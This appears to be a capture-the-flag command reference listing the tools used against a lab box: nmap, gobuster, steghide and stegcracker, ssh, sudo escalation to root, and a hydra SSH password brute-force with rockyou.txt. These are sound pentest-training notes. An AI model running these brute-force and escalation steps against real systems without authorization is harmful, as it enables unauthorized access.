## Commands Used
---
#### nmap

`nmap - Network exploration tool and security / port scanner`
```
nmap -sC -sV <Target IP> 
```
>-sC: equivalent to --script=default

>-sV: Probe open ports to determine service/version info
---
#### gobuster
`gobuster - Directory/file & DNS busting tool written in Go`
```
gobuster dir -u http://<Target IP> -w /usr/share/wordlists/dirb/common.txt
```
> dir - the classic directory brute-forcing mode

> -w, --wordlist string
---
#### wget
`Wget - The non-interactive network downloader.`
```
wget http://<Target IP>/brooklyn99.jpg
```
>Syntax: wget [option]... [URL]...
---
#### steghide
`steghide - a steganography program
`
```
steghide extract -sf brooklyn99.jpg
```
>‐sf, ‐‐stegofile filename
---
#### ssh
`ssh — OpenSSH remote login client`
```
ssh holt@<Target IP>
```
---
#### sudo
`sudo, sudoedit — execute a command as another user`
```
sudo -l
```
>-l, -‐list
>>If no command is specified, list the privileges for the invoking user (or the user specified by the -U option) on the current host.
---
#### su
`su - run a command with substitute user and group ID`
```
sudo su root
```
>su allows commands to be run with a substitute user and group ID.
>>su [options] [-] [user [argument...]]

---
#### stegcracker
`stegcracker -  steganography brute-force tool`
```
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```
---
#### ftp> get
`FTP - File Transfer Protocol client`
```
get note_to_jake.txt
```
>get <filename> : Download the specified file from the remote FTP server to the local machine
---
#### hydra
`hydra - a very fast network logon cracker which supports many different services`
```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<Target IP>
```

>-l LOGIN

>-p PASS
>>or -P FILE try password PASS, or load several passwords from FILE
